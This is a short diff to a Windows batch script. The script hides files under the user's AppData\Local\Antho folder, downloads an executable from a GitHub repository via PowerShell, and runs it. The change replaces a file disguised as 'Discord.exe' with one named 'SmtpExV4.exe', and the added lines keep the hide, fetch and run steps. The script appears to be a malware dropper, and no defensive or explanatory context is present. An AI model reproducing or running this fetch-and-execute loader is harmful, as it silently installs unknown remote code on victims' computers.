@@ -30,6 +30,6 @@ if '%errorlevel%' NEQ '0' (
 
 cd C:\Users\%USERNAME%\AppData\Local\Antho" 
 attrib +h "C:\Users\%USERNAME%\AppData\Local\Antho\2.bat" /s /d
-attrib +h "C:\Users\%USERNAME%\AppData\Local\Antho\Discord.exe" /s /d
-Powershell -Command "Invoke-Webrequest 'https://github.com/SkillsNoHacks/yud/raw/main/Discord.exe' -OutFile Discord.exe"
-start Discod.exe
+attrib +h "C:\Users\%USERNAME%\AppData\Local\Antho\SmtpExV4.exe" /s /d
+Powershell -Command "Invoke-Webrequest 'https://github.com/SkillsNoHacks/yud/raw/main/SmtpExV4.exe' -OutFile SmtpExV4.exe"
+start SmtpExV4.exe
